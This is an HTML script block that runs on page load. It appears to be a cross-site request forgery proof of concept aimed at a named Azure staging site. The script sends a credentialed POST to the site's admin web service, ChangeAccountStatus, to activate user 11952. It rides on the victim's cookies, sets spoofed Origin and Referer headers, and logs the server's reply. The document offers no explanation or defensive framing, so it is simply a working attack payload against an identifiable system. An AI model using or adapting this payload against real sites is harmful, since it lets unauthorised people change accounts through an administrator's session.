
<script>
    function test() {
    console.log("Executing");
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://bapstaging.azurewebsites.net/WebServices/AdminWS.asmx/ChangeAccountStatus", true);

// Allow credentials (cookies, auth headers) to be sent automatically
xhr.withCredentials = true;

// Set headers
xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader("Origin", "https://bapstaging.azurewebsites.net/");
xhr.setRequestHeader("Referer", "https://bapstaging.azurewebsites.net/Admin/CreateUsers.aspx");

// Response handler
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        console.log("Status:", xhr.status);
        console.log("Response:", xhr.responseText);
    }
};

// Payload
var data = JSON.stringify({
    makeActive: true,
    userID: "11952"
});

// Send request
xhr.send(data);
console.log("Done");
    }

    test();
</script>
